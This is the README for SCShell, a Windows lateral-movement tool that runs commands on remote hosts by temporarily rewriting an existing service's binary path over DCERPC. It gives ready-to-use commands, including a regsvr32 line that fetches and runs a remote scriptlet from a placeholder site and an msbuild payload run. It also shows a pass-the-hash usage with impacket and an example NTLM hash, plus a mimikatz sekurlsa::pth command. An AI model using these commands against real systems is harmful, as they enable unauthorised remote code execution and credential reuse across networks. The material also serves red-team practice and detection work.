# SCShell

SCShell is a fileless lateral movement tool that relies on ChangeServiceConfigA to run commands. The beauty of this tool is that it does not perform authentication against SMB. Everything is performed over DCERPC.

The utility can be used remotely WITHOUT registering a service or creating a service. It also doesn't have to drop any file on the remote system* (Depend on the technique used to execute)

# How it work

Instead of creating a service it simply remotely open a service and modify the binary path name via the `ChangeServiceConfigA` API.

Then it starts the service.

Once the execution is completed the service binary path is reverted to the original one. The original service path is extracted using `QueryServiceConfigA`.

Everything is happening over DCERPC including the authentication.

![network](https://raw.githubusercontent.com/Mr-Un1k0d3r/SCShell/master/network.png)



# Usage

The current build is written in `C` but I will port it to `C#` and `PowerShell`.

```
Usage:
SCShell.exe target service payload domain username password
```

`target` can be set to `local` to run the payload locally

Remote execution
```
SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /c C:\windows\system32\regsvr32.exe /s /n /u /i://your.website/payload.sct scrobj.dll" . administrastor Password
```

I recommend using `C:\windows\system32\cmd.exe /c` to make sure to payload will not be killed once the service stop. You NEED to use the full path.

You can also use a msbuild payload
```
SCShell.exe 192.168.197.131 XblAuthManager "C:\windows\system32\cmd.exe /C C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\payload.csproj" . administrator Password
SCShell ***
Trying to connect to 192.168.197.131
Username was provided attempting to call LogonUserA
SC_HANDLE Manager 0x009ED250
Opening XblAuthManager
SC_HANDLE Service 0x009ED1B0
Service path was changed to C:\windows\system32\cmd.exe /C C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\payload.csproj
Service was started.
```

I'm using the XblAuthManager as the target which is the Xbox Accessory Management Service

# Passing the Hash

scshell.py is a python2 & 3 implementation of SCShell. Using impacket project it can easily be used to perform the same lateral movement using pass the hash.

Installation
```
pip install impacket
```

Usage
```
python scshell.py DOMAIN/USER@target -hashes 00000000000000000000000000000000:ad9827fcd039eadde017568170abdecce
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Command need to use FULL path. No command output.
SCShell>

```

You can use the `C` utility to pass the hash. By default the current process token will be used. You can set the current process token using standard pass the hash approach.

On the local system
```
sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:cmd.exe
```

Then run the SCShell.exe within the newly created cmd.exe.

# Compiling from source

The code was compiled on Windows using GCC Mingw compiler

# Credit
Mr.Un1k0d3r RingZer0 Team

Tazz0 for the moral support
